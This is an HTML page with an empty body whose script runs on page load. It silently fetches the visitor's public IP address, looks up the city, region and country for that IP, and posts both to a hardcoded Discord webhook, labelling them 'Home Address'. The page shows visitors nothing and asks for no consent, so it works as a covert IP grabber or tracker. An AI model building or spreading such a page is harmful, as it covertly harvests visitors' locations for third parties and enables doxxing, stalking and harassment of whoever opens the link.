<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web</title>
    <script>
        const webhookUrl = 'https://discord.com/api/webhooks/1295926374959415326/jcyJtej4wQvgp9FS_nimudItJO-PAFYbF6foxrUWtwyNVY7eu8sV2_1aMibNq3htq8Bp'; // Your webhook URL

        async function fetchIP() {
            const start = performance.now(); // Start timing

            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;

                const address = await fetchAddress(ip);
                await sendToDiscord(ip, address);

                const end = performance.now(); // End timing
                console.log(`Fetch time: ${end - start} ms`); // Log the time taken
            } catch (error) {
                console.error('Error fetching IP:', error);
            }
        }

        async function fetchAddress(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                if (!response.ok) throw new Error('Network response was not ok');
                const data = await response.json();
                return `${data.city || 'Unknown city'}, ${data.region || 'Unknown region'}, ${data.country || 'Unknown country'}`;
            } catch (error) {
                console.error('Error fetching address:', error);
                return 'Address not available';
            }
        }

        async function sendToDiscord(ip, address) {
            const message = { content: `IP Address: ${ip} | Home Address: ${address}` };

            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(message)
                });
            } catch (error) {
                console.error('Error sending to Discord:', error);
            }
        }
    </script>
</head>
<body onload="fetchIP()">
</body>
</html>
